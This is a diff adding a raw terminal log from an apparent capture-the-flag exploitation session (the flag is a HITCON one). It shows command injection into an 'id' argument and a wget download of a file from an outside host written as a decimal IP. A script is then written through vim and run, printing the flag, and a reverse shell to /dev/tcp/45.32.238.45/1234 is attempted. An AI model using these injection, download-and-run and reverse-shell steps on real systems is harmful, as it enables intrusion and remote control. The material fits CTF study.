@@ -1,0 +1,32 @@
+id ()wget 757132845:5000#+61
+> id
+> Connecting to 757132845:5000 (45.32.238.45:5000)
+#+61                 100% |*******************************|    66   0:00:00 ETA
+
+double free or corruption (out)
+Aborted (core dumped)
+ls
+> #%61
+#+#61aaa
+#+%61aaa
+#+61
+95.161.246.15
+hui
+index.html
+vim
+> bad command: vim
+> id ()vim
+id
+> Vim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+
+printf :o #+61
+printf :w sheeeeel
+printf :x 
+
+id ()bash sheeeeel
+> id
+> sheeeeel: line 1: i!/bin/bash: No such file or directory
+hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}
+sheeeeel: connect: Connection refused
+sheeeeel: line 3: /dev/tcp/45.32.238.45/1234: Connection refused
